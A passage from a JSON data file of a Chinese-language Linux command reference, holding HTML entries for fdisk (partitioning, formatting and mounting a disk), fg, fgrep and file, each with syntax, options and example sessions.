id=\"参数\">参数</h3>\n<p>设备文件：指定要进行分区或者显示分区的硬盘设备文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>首先选择要进行操作的磁盘：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># fdisk /dev/sdb</span>\n</code></pre>\n<p>输入<code>m</code>列出可以执行的命令：</p>\n<pre><code class=\"language-shell\">command (m <span class=\"hljs-keyword\">for</span> help): m\nCommand action\n   a   toggle a bootable flag\n   b   edit bsd disklabel\n   c   toggle the dos compatibility flag\n   d   <span class=\"hljs-built_in\">delete</span> a <span class=\"hljs-built_in\">partition</span>\n   l   list known <span class=\"hljs-built_in\">partition</span> types\n   m   <span class=\"hljs-built_in\">print</span> this menu\n   n   add a <span class=\"hljs-built_in\">new</span> <span class=\"hljs-built_in\">partition</span>\n   o   create a <span class=\"hljs-built_in\">new</span> empty DOS <span class=\"hljs-built_in\">partition</span> table\n   p   <span class=\"hljs-built_in\">print</span> the <span class=\"hljs-built_in\">partition</span> table\n   q   <span class=\"hljs-built_in\">quit</span> without <span class=\"hljs-built_in\">saving</span> changes\n   s   create a <span class=\"hljs-built_in\">new</span> empty Sun disklabel\n   t   change a <span class=\"hljs-built_in\">partition</span>'s <span class=\"hljs-built_in\">system</span> id\n   u   change <span class=\"hljs-built_in\">display</span>/entry <span class=\"hljs-built_in\">units</span>\n   v   verify the <span class=\"hljs-built_in\">partition</span> table\n   w   write table to disk <span class=\"hljs-keyword\">and</span> exit\n   x   extra functionality (experts only)\n</code></pre>\n<p>输入<code>p</code>列出磁盘目前的分区情况：</p>\n<pre><code class=\"language-shell\">Command (m for help): p\n\nDisk /dev/sdb:<span class=\"hljs-number\"> 3221 </span>MB,<span class=\"hljs-number\"> 3221225472 </span>bytes\n255 heads,<span class=\"hljs-number\"> 63 </span>sectors/track,<span class=\"hljs-number\"> 391 </span>cylinders\nUnits = cylinders of<span class=\"hljs-number\"> 16065 </span>*<span class=\"hljs-number\"> 512 </span>=<span class=\"hljs-number\"> 8225280 </span>bytes\n\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sdb1              <span class=\"hljs-number\"> 1 </span>         <span class=\"hljs-number\"> 1 </span>      <span class=\"hljs-number\"> 8001 </span>  8e  Linux LVM\n/dev/sdb2              <span class=\"hljs-number\"> 2 </span>        <span class=\"hljs-number\"> 26 </span>     200812+ <span class=\"hljs-number\"> 83 </span> Linux\n</code></pre>\n<p>输入<code>d</code>然后选择分区，删除现有分区：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Command</span> (m for help): d\n<span class=\"hljs-attribute\">Partition</span> number (<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">4</span>): <span class=\"hljs-number\">1</span>\n\n<span class=\"hljs-attribute\">Command</span> (m for help): d\n<span class=\"hljs-attribute\">Selected</span> partition <span class=\"hljs-number\">2</span>\n</code></pre>\n<p>查看分区情况，确认分区已经删除：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Command</span> (m for help): print\n\n<span class=\"hljs-attribute\">Disk</span> /dev/sdb: <span class=\"hljs-number\">3221</span> MB, <span class=\"hljs-number\">3221225472</span> bytes\n<span class=\"hljs-attribute\">255</span> heads, <span class=\"hljs-number\">63</span> sectors/track, <span class=\"hljs-number\">391</span> cylinders\n<span class=\"hljs-attribute\">Units</span> = cylinders of <span class=\"hljs-number\">16065</span> * <span class=\"hljs-number\">512</span> = <span class=\"hljs-number\">8225280</span> bytes\n\n   <span class=\"hljs-attribute\">Device</span> Boot      Start         End      Blocks   Id  System\n\n<span class=\"hljs-attribute\">Command</span> (m for help):\n</code></pre>\n<p>输入<code>n</code>建立新的磁盘分区，首先建立两个主磁盘分区：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Command</span> (m for help): n\n<span class=\"hljs-attribute\">Command</span> action\n   <span class=\"hljs-attribute\">e</span>   extended\n   <span class=\"hljs-attribute\">p</span>   primary partition (<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">4</span>)\n<span class=\"hljs-attribute\">p</span>    //建立主分区\n<span class=\"hljs-attribute\">Partition</span> number (<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">4</span>): <span class=\"hljs-number\">1</span>  //分区号\n<span class=\"hljs-attribute\">First</span> cylinder (<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">391</span>, default <span class=\"hljs-number\">1</span>):  //分区起始位置\n<span class=\"hljs-attribute\">Using</span> default value <span class=\"hljs-number\">1</span>\n<span class=\"hljs-attribute\">last</span> cylinder or +size or +sizeM or +sizeK (<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">391</span>, default <span class=\"hljs-number\">391</span>): <span class=\"hljs-number\">100</span>  //分区结束位置，单位为扇区\n\n<span class=\"hljs-attribute\">Command</span> (m for help): n  //再建立一个分区\n<span class=\"hljs-attribute\">Command</span> action\n   <span class=\"hljs-attribute\">e</span>   extended\n   <span class=\"hljs-attribute\">p</span>   primary partition (<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">4</span>)\n<span class=\"hljs-attribute\">p</span> \n<span class=\"hljs-attribute\">Partition</span> number (<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">4</span>): <span class=\"hljs-number\">2</span>  //分区号为<span class=\"hljs-number\">2</span>\n<span class=\"hljs-attribute\">First</span> cylinder (<span class=\"hljs-number\">101</span>-<span class=\"hljs-number\">391</span>, default <span class=\"hljs-number\">101</span>):\n<span class=\"hljs-attribute\">Using</span> default value <span class=\"hljs-number\">101</span>\n<span class=\"hljs-attribute\">Last</span> cylinder or +size or +sizeM or +sizeK (<span class=\"hljs-number\">101</span>-<span class=\"hljs-number\">391</span>, default <span class=\"hljs-number\">391</span>): +<span class=\"hljs-number\">200</span>M  //分区结束位置，单位为M\n</code></pre>\n<p>确认分区建立成功：</p>\n<pre><code class=\"language-shell\">Command (m for help): p\n\nDisk /dev/sdb:<span class=\"hljs-number\"> 3221 </span>MB,<span class=\"hljs-number\"> 3221225472 </span>bytes\n255 heads,<span class=\"hljs-number\"> 63 </span>sectors/track,<span class=\"hljs-number\"> 391 </span>cylinders\nUnits = cylinders of<span class=\"hljs-number\"> 16065 </span>*<span class=\"hljs-number\"> 512 </span>=<span class=\"hljs-number\"> 8225280 </span>bytes\n\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sdb1              <span class=\"hljs-number\"> 1 </span>       <span class=\"hljs-number\"> 100 </span>     803218+ <span class=\"hljs-number\"> 83 </span> Linux\n/dev/sdb2            <span class=\"hljs-number\"> 101 </span>       <span class=\"hljs-number\"> 125 </span>     200812+ <span class=\"hljs-number\"> 83 </span> Linux\n</code></pre>\n<p>再建立一个逻辑分区：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Command</span> (m for help): n\n<span class=\"hljs-attribute\">Command</span> action\n   <span class=\"hljs-attribute\">e</span>   extended\n   <span class=\"hljs-attribute\">p</span>   primary partition (<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">4</span>)\n<span class=\"hljs-attribute\">e</span>  //选择扩展分区\n<span class=\"hljs-attribute\">Partition</span> number (<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">4</span>): <span class=\"hljs-number\">3</span>\n<span class=\"hljs-attribute\">First</span> cylinder (<span class=\"hljs-number\">126</span>-<span class=\"hljs-number\">391</span>, default <span class=\"hljs-number\">126</span>):\n<span class=\"hljs-attribute\">Using</span> default value <span class=\"hljs-number\">126</span>\n<span class=\"hljs-attribute\">Last</span> cylinder or +size or +sizeM or +sizeK (<span class=\"hljs-number\">126</span>-<span class=\"hljs-number\">391</span>, default <span class=\"hljs-number\">391</span>):\n<span class=\"hljs-attribute\">Using</span> default value <span class=\"hljs-number\">391</span>\n</code></pre>\n<p>确认扩展分区建立成功：</p>\n<pre><code class=\"language-shell\">Command (m for help): p\n\nDisk /dev/sdb:<span class=\"hljs-number\"> 3221 </span>MB,<span class=\"hljs-number\"> 3221225472 </span>bytes\n255 heads,<span class=\"hljs-number\"> 63 </span>sectors/track,<span class=\"hljs-number\"> 391 </span>cylinders\nUnits = cylinders of<span class=\"hljs-number\"> 16065 </span>*<span class=\"hljs-number\"> 512 </span>=<span class=\"hljs-number\"> 8225280 </span>bytes\n\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sdb1              <span class=\"hljs-number\"> 1 </span>       <span class=\"hljs-number\"> 100 </span>     803218+ <span class=\"hljs-number\"> 83 </span> Linux\n/dev/sdb2            <span class=\"hljs-number\"> 101 </span>       <span class=\"hljs-number\"> 125 </span>     200812+ <span class=\"hljs-number\"> 83 </span> Linux\n/dev/sdb3            <span class=\"hljs-number\"> 126 </span>       <span class=\"hljs-number\"> 391 </span>   <span class=\"hljs-number\"> 2136645 </span>  <span class=\"hljs-number\"> 5 </span> Extended\n</code></pre>\n<p>在扩展分区上建立两个逻辑分区：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Command</span> (m for help): n\n<span class=\"hljs-attribute\">Command</span> action\n   <span class=\"hljs-attribute\">l</span>   logical (<span class=\"hljs-number\">5</span> or over)\n   <span class=\"hljs-attribute\">p</span>   primary partition (<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">4</span>)\n<span class=\"hljs-attribute\">l</span> //选择逻辑分区\n<span class=\"hljs-attribute\">First</span> cylinder (<span class=\"hljs-number\">126</span>-<span class=\"hljs-number\">391</span>, default <span class=\"hljs-number\">126</span>):\n<span class=\"hljs-attribute\">Using</span> default value <span class=\"hljs-number\">126</span>\n<span class=\"hljs-attribute\">Last</span> cylinder or +size or +sizeM or +sizeK (<span class=\"hljs-number\">126</span>-<span class=\"hljs-number\">391</span>, default <span class=\"hljs-number\">391</span>): +<span class=\"hljs-number\">400</span>M    \n\n<span class=\"hljs-attribute\">Command</span> (m for help): n\n<span class=\"hljs-attribute\">Command</span> action\n   <span class=\"hljs-attribute\">l</span>   logical (<span class=\"hljs-number\">5</span> or over)\n   <span class=\"hljs-attribute\">p</span>   primary partition (<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">4</span>)\n<span class=\"hljs-attribute\">l</span>\n<span class=\"hljs-attribute\">First</span> cylinder (<span class=\"hljs-number\">176</span>-<span class=\"hljs-number\">391</span>, default <span class=\"hljs-number\">176</span>):\n<span class=\"hljs-attribute\">Using</span> default value <span class=\"hljs-number\">176</span>\n<span class=\"hljs-attribute\">Last</span> cylinder or +size or +sizeM or +sizeK (<span class=\"hljs-number\">176</span>-<span class=\"hljs-number\">391</span>, default <span class=\"hljs-number\">391</span>):\n<span class=\"hljs-attribute\">Using</span> default value <span class=\"hljs-number\">391</span>\n</code></pre>\n<p>确认逻辑分区建立成功：</p>\n<pre><code class=\"language-shell\">Command (m for help): p\n\nDisk /dev/sdb:<span class=\"hljs-number\"> 3221 </span>MB,<span class=\"hljs-number\"> 3221225472 </span>bytes\n255 heads,<span class=\"hljs-number\"> 63 </span>sectors/track,<span class=\"hljs-number\"> 391 </span>cylinders\nUnits = cylinders of<span class=\"hljs-number\"> 16065 </span>*<span class=\"hljs-number\"> 512 </span>=<span class=\"hljs-number\"> 8225280 </span>bytes\n\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sdb1              <span class=\"hljs-number\"> 1 </span>       <span class=\"hljs-number\"> 100 </span>     803218+ <span class=\"hljs-number\"> 83 </span> Linux\n/dev/sdb2            <span class=\"hljs-number\"> 101 </span>       <span class=\"hljs-number\"> 125 </span>     200812+ <span class=\"hljs-number\"> 83 </span> Linux\n/dev/sdb3            <span class=\"hljs-number\"> 126 </span>       <span class=\"hljs-number\"> 391 </span>   <span class=\"hljs-number\"> 2136645 </span>  <span class=\"hljs-number\"> 5 </span> Extended\n/dev/sdb5            <span class=\"hljs-number\"> 126 </span>       <span class=\"hljs-number\"> 175 </span>     401593+ <span class=\"hljs-number\"> 83 </span> Linux\n/dev/sdb6            <span class=\"hljs-number\"> 176 </span>       <span class=\"hljs-number\"> 391 </span>    1734988+ <span class=\"hljs-number\"> 83 </span> Linux\n\nCommand (m for help):\n</code></pre>\n<p>从上面的结果我们可以看到，在硬盘sdb我们建立了2个主分区（sdb1，sdb2），1个扩展分区（sdb3），2个逻辑分区（sdb5，sdb6）</p>\n<p>注意：主分区和扩展分区的磁盘号位1-4，也就是说最多有4个主分区或者扩展分区，逻辑分区开始的磁盘号为5，因此在这个实验中试没有sdb4的。</p>\n<p>最后对分区操作进行保存：</p>\n<pre><code class=\"language-shell\">Command (m <span class=\"hljs-keyword\">for</span> help): w\nThe <span class=\"hljs-keyword\">partition</span> <span class=\"hljs-keyword\">table</span> has been altered!\n\nCalling ioctl() <span class=\"hljs-keyword\">to</span> re-<span class=\"hljs-keyword\">read</span> <span class=\"hljs-keyword\">partition</span> <span class=\"hljs-keyword\">table</span>.\nSyncing disks.\n</code></pre>\n<p>建立好分区之后我们还需要对分区进行格式化才能在系统中使用磁盘。</p>\n<p>在sdb1上建立ext2分区：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# mkfs.ext2 /dev/sdb1\nmke2fs 1.39 (29-May-2006)\nFilesystem label=\nOS type: Linux\nBlock <span class=\"hljs-attribute\">size</span>=4096 (<span class=\"hljs-attribute\">log</span>=2)\nFragment <span class=\"hljs-attribute\">size</span>=4096 (<span class=\"hljs-attribute\">log</span>=2)\n100576 inodes, 200804 blocks\n10040 blocks (5.00%) reserved <span class=\"hljs-keyword\">for</span> the super<span class=\"hljs-built_in\"> user\n</span>First data <span class=\"hljs-attribute\">block</span>=0\nMaximum filesystem <span class=\"hljs-attribute\">blocks</span>=209715200\n7 block groups\n32768 blocks per group, 32768 fragments per<span class=\"hljs-built_in\"> group\n</span>14368 inodes per<span class=\"hljs-built_in\"> group\n</span>Superblock backups stored on blocks:\n        32768, 98304, 163840\n\nWriting inode tables: done                           \nWriting superblocks <span class=\"hljs-keyword\">and</span> filesystem<span class=\"hljs-built_in\"> accounting </span>information: done\n\nThis filesystem will be automatically checked every 32 mounts <span class=\"hljs-keyword\">or</span>\n180 days, whichever comes first.  Use tune2fs -c <span class=\"hljs-keyword\">or</span> -i <span class=\"hljs-keyword\">to</span> override.\n</code></pre>\n<p>在sdb6上建立ext3分区：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# mkfs.ext3 /dev/sdb6\nmke2fs 1.39 (29-May-2006)\nFilesystem label=\nOS type: Linux\nBlock <span class=\"hljs-attribute\">size</span>=4096 (<span class=\"hljs-attribute\">log</span>=2)\nFragment <span class=\"hljs-attribute\">size</span>=4096 (<span class=\"hljs-attribute\">log</span>=2)\n217280 inodes, 433747 blocks\n21687 blocks (5.00%) reserved <span class=\"hljs-keyword\">for</span> the super<span class=\"hljs-built_in\"> user\n</span>First data <span class=\"hljs-attribute\">block</span>=0\nMaximum filesystem <span class=\"hljs-attribute\">blocks</span>=444596224\n14 block groups\n32768 blocks per group, 32768 fragments per<span class=\"hljs-built_in\"> group\n</span>15520 inodes per<span class=\"hljs-built_in\"> group\n</span>Superblock backups stored on blocks:\n        32768, 98304, 163840, 229376, 294912\n\nWriting inode tables: done                           \nCreating journal (8192 blocks): done\nWriting superblocks <span class=\"hljs-keyword\">and</span> filesystem<span class=\"hljs-built_in\"> accounting </span>information: done\n\nThis filesystem will be automatically checked every 32 mounts <span class=\"hljs-keyword\">or</span>\n180 days, whichever comes first.  Use tune2fs -c <span class=\"hljs-keyword\">or</span> -i <span class=\"hljs-keyword\">to</span> override.\n[root@localhost ~]#\n</code></pre>\n<p>建立两个目录<code>/oracle</code>和<code>/web</code>，将新建好的两个分区挂载到系统：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># mkdir /oracle</span>\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># mkdir /web</span>\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># mount /dev/sdb1 /oracle</span>\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># mount /dev/sdb6 /web</span>\n</code></pre>\n<p>查看分区挂载情况：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># df -h</span>\n文件系统              容量  已用 可用 已用% 挂载点\n<span class=\"hljs-regexp\">/dev/m</span>apper/VolGroup00-LogVol00\n                      <span class=\"hljs-number\">6.7</span>G  <span class=\"hljs-number\">2.8</span>G  <span class=\"hljs-number\">3.6</span>G  <span class=\"hljs-number\">44</span>% /\n<span class=\"hljs-regexp\">/dev/</span>sda1              <span class=\"hljs-number\">99</span>M   <span class=\"hljs-number\">12</span>M   <span class=\"hljs-number\">82</span>M  <span class=\"hljs-number\">13</span>% /boot\ntmpfs                 <span class=\"hljs-number\">125</span>M     <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">125</span>M   <span class=\"hljs-number\">0</span>% <span class=\"hljs-regexp\">/dev/</span>shm\n<span class=\"hljs-regexp\">/dev/</span>sdb1             <span class=\"hljs-number\">773</span>M  <span class=\"hljs-number\">808</span>K  <span class=\"hljs-number\">733</span>M   <span class=\"hljs-number\">1</span>% /oracle\n<span class=\"hljs-regexp\">/dev/</span>sdb6             <span class=\"hljs-number\">1.7</span>G   <span class=\"hljs-number\">35</span>M  <span class=\"hljs-number\">1.6</span>G   <span class=\"hljs-number\">3</span>% /web\n</code></pre>\n<p>如果需要每次开机自动挂载则需要修改<code>/etc/fstab</code>文件，加入两行配置：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# vim <span class=\"hljs-regexp\">/etc/</span>fstab\n\n<span class=\"hljs-regexp\">/dev/</span>VolGroup00<span class=\"hljs-regexp\">/LogVol00 /</span>                       ext3    defaults        <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">1</span>\nLABEL=<span class=\"hljs-regexp\">/boot             /</span>boot                   ext3    defaults        <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">2</span>\ntmpfs                   <span class=\"hljs-regexp\">/dev/</span>shm                tmpfs   defaults        <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0</span>\ndevpts                  <span class=\"hljs-regexp\">/dev/</span>pts                devpts  gid=<span class=\"hljs-number\">5</span>,mode=<span class=\"hljs-number\">620</span>  <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0</span>\nsysfs                   /sys                    sysfs   defaults        <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0</span>\nproc                    /proc                   proc    defaults        <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0</span>\n<span class=\"hljs-regexp\">/dev/</span>VolGroup00/LogVol01 swap                    swap    defaults        <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0</span>\n<span class=\"hljs-regexp\">/dev/</span>sdb1               /oracle                 ext2    defaults        <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0</span>\n<span class=\"hljs-regexp\">/dev/</span>sdb6               /web                    ext3    defaults        <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "fg",
        "des": "将后台作业移动到前台终端运行",
        "body": "<h1 id=\"fg\">fg</h1>\n<p>将后台作业移动到前台终端运行</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">fg</span><span class=\"hljs-meta\"> [job_spec ...]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li><p>用于将后台作业（在后台运行的或者在后台挂起的作业）放到前台终端运行。</p>\n</li>\n<li><p>若后台任务中只有一个，则使用该命令时可以省略任务号。</p>\n</li>\n</ul>\n<h2 id=\"参数\">参数</h2>\n<p>job_spec（可选）：指定要移动到前台执行的作业标识符，可以是一到多个。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回作业的执行状态，如果发生了错误返回失败。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 运行sleep命令，然后按下ctrl+z。</span>\n<span class=\"hljs-keyword\">sleep</span> <span class=\"hljs-number\">60</span>\n^Z\n[<span class=\"hljs-number\">1</span>]+  Stopped                 <span class=\"hljs-keyword\">sleep</span> <span class=\"hljs-number\">60</span>\n\n<span class=\"hljs-comment\"># 使用fg命令使得作业在前台运行。</span>\nfg %1\n\n<span class=\"hljs-comment\"># 返回信息：</span>\n<span class=\"hljs-keyword\">sleep</span> <span class=\"hljs-number\">60</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><code>bash</code>的作业控制命令包括<code>bg fg kill wait disown suspend</code>。</li>\n<li>该命令需要<code>set</code>选项<code>monitor</code>处于开启状态时才能执行；查看作业控制状态：输入<code>set -o</code>查看<code>monitor</code>行；执行<code>set -o monitor</code>或<code>set -m</code>开启该选项。</li>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "fgrep",
        "des": "为文件搜索文字字符串",
        "body": "<h1 id=\"fgrep\">fgrep</h1>\n<p>为文件搜索文字字符串</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>fgrep命令</strong> 是用来搜索 file 参数指定的输入文件（缺省为标准输入）中的匹配模式的行。fgrep 命令特别搜索 Pattern 参数，它们是固定的字符串。如果在 File 参数中指定一个以上的文件 fgrep 命令将显示包含匹配行的文件。</p>\n<p>fgrep 命令于 grep 和 egrep 命令不同，因为它搜索字符串而不是搜索匹配表达式的模式。fgrep 命令使用快速的压缩算法。<code>$, *, &amp;#91;, |, (, )</code>和<code>\\</code>等字符串被 fgrep 命令按字面意思解释。这些字符并不解释为正则表达式，但它们在 grep 和 egrep 命令中解释为正则表达式。因为这些字符对于 shell 有特定的含义，完整的字符串应该加上单引号<code>‘ ... ’</code>。. 如果没有指定文件， fgrep 命令假定标准输入。一般，找到的每行都复制到标准输出中去。如果不止一个输入文件，则在找到的每行前打印文件名。</p>\n<ol>\n<li> fgrep 命令和带 -F 标志的 grep命令是一样的但出错和用法消息不同-s 标志功能也不同。</li>\n<li> 每行限制在 2048 个字节。</li>\n<li> 段落（-p 标志下）目前限制在5000个字符的长度。</li>\n<li> 不要在特定的文件中运行 grep 命令，因为会产生不可预料的结果。</li>\n<li> 输入行不能包含空字符。</li>\n<li> 输入文件应该以换行字符结尾。</li>\n<li> 虽然可以同时指定很多标志，但某些标志会覆盖其余的标志。例如，如果同时指定 -l 和 -n ，只有文件名写入到标准输出中去。</li>\n</ol>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">fgrep</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b：在找到的每行之前添加行所在的块编号。使用此标志有助于按照上下文查找磁盘块号码。-b 标志不能用于标准输入或者管道输入。</span>\n<span class=\"hljs-deletion\">-c：仅显示匹配行的计数。</span>\n<span class=\"hljs-deletion\">-e 模式：指定模式。这个工作模式很简单，但当此模式以 a-(减号) 开头时却是很有用的。</span>\n<span class=\"hljs-deletion\">-f StringFile：指定包含字符串的文件。</span>\n<span class=\"hljs-deletion\">-h：当多个文件被处理时隐藏文件名。</span>\n<span class=\"hljs-deletion\">-i：当进行比较时忽略字母的大小写。</span>\n<span class=\"hljs-deletion\">-l：只列出包含匹配行的文件名（一次）。文件名之间用换行符分隔。</span>\nn：将文件中每行的相对行号置于行前。\n<span class=\"hljs-deletion\">-pSeparator：显示包含匹配行的整个段落。段落之间将按照Separator参数指定的段落分隔符加以分隔，这些分隔符是与搜索模式有着相同格式的模式。包含段落分隔符的行将仅用作分隔符；它们不会被包含在输出中。缺省的段落分隔符是空白行。</span>\n<span class=\"hljs-deletion\">-q：禁止所有写入到标准输出的操作，不管是否为匹配行。如果选中输入行，以 0 状态退出。</span>\n<span class=\"hljs-deletion\">-s：仅显示出错消息。这在检查状态时很有用。</span>\n<span class=\"hljs-deletion\">-v：显示除了匹配特定模式的行以外的所有行。</span>\n<span class=\"hljs-deletion\">-w：执行单词搜索。</span>\n<span class=\"hljs-deletion\">-x：显示匹配模式的行，要求无额外的字符。</span>\n<span class=\"hljs-deletion\">-y：当进行比较时忽略字符的大小写。</span>\n</code></pre>\n<p>此命令返回以下出口值：</p>\n<pre><code class=\"language-shell\">0    找到匹配项。\n1    未找到匹配项。\n<span class=\"hljs-meta\">&gt;</span><span class=\"language-bash\">1   发现语法错误，或者文件不可访问（即使找到了匹配项）。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>搜索几个文件中的一个简单字符串：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">fgrep</span> strcpy <span class=\"hljs-regexp\">*.c</span>\n</code></pre>\n<p>在当前目录下所有以 .c 字符串结尾的文件中搜索字符串 strcpy。</p>\n<p> <strong>计数匹配某模式的行数：</strong> </p>\n<pre><code class=\"language-shell\">fgrep -<span class=\"hljs-keyword\">c</span> 『{』pgm.cfgrep -<span class=\"hljs-keyword\">c</span> 『}』pgm.<span class=\"hljs-keyword\">c</span>\n</code></pre>\n<p>显示在 pgm.c 中包含左括号和右括号的行的数目。</p>\n<p>如果在您的 C 程序中一行中没有包含多于一个 { (左括号) 或者 } (右括号)，并且括号正确匹配，那么这两个数字将是一样的。如果这两个数字不一样，您可以将包含括号的行按照他们在文件中的位置顺序显示出来，使用以下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">egrep</span> {\\|} <span class=\"hljs-keyword\">pgm</span>.c\n</code></pre>\n<p> <strong>显示包含某模式的文件名：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">fgrep</span> -l strcpy <span class=\"hljs-regexp\">*.c</span>\n</code></pre>\n<p>搜索当前目录下以 .c 结尾的文件，然后显示包含 strcpy 字符串的文件名。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "file",
        "des": "用来探测给定文件的类型",
        "body": "<h1 id=\"file\">file</h1>\n<p>用来探测给定文件的类型</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>file命令</strong> 用来探测给定文件的类型。file命令对文件的检查分为文件系统、魔法幻数检查和语言检查3个过程。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">file</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b：列出辨识结果时，不显示文件名称；</span>\n<span class=\"hljs-deletion\">-c：详细显示指令执行过程，便于排错或分析程序执行的情形；</span>\n<span class=\"hljs-deletion\">-f&lt;名称文件&gt;：指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称；</span>\n<span class=\"hljs-deletion\">-L：直接显示符号连接所指向的文件类别；</span>\n<span class=\"hljs-deletion\">-m&lt;魔法数字文件&gt;：指定魔法数字文件；</span>\n<span class=\"hljs-deletion\">-v：显示版本信息；</span>\n<span class=\"hljs-deletion\">-z：尝试去解读压缩文件的内容。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>显示文件类型</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# <span class=\"hljs-keyword\">file</span> install.<span class=\"hljs-keyword\">log</span>\ninstall.<span class=\"hljs-keyword\">log</span>: UTF<span class=\"hljs-number\">-8</span> Unicode <span class=\"hljs-keyword\">text</span>\n\n[root@localhost ~]# <span class=\"hljs-keyword\">file</span> -b install.<span class=\"hljs-keyword\">log</span>      &lt;== 不显示文件名称\nUTF<span class=\"hljs-number\">-8</span> Unicode <span class=\"hljs-keyword\">text</span>\n\n[root@localhost ~]# <span class=\"hljs-keyword\">file</span> -i install.<span class=\"hljs-keyword\">log</span>      &lt;== 显示MIME类别。\ninstall.<span class=\"hljs-keyword\">log</span>: <span class=\"hljs-keyword\">text</span>/plain; charset=utf<span class=\"hljs-number\">-8</span>\n\n[root@localhost ~]# <span class=\"hljs-keyword\">file</span> -b -i install.<span class=\"hljs-keyword\">log</span>\n<span class=\"hljs-keyword\">text</span>/plain; charset=utf<span class=\"hljs-number\">-8</span>\n</code></pre>\n<p>显示符号链接的文件类型</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-meta\">@localhost</span> ~]<span class=\"hljs-comment\"># ls -l /var/mail</span>\nlrwxrwxrwx <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">10</span> <span class=\"hljs-number\">08</span><span class=\"hljs-number\">-13</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">11</span> /<span class=\"hljs-keyword\">var</span>/mail -&gt; spool/mail\n\n[root<span class=\"hljs-meta\">@localhost</span> ~]<span class=\"hljs-comment\"># file /var/mail</span>\n/<span class=\"hljs-keyword\">var</span>/mail: symbolic link to `spool/mail'\n\n[root<span class=\"hljs-meta\">@localhost</span> ~]<span class=\"hljs-comment\"># file -L /var/mail</span>\n/<span class=\"hljs-keyword\">var</span>/mail: directory\n\n[root<span class=\"hljs-meta\">@localhost</span> ~]<span class=\"hljs-comment\"># file /var/spool/mail</span>\n/<span 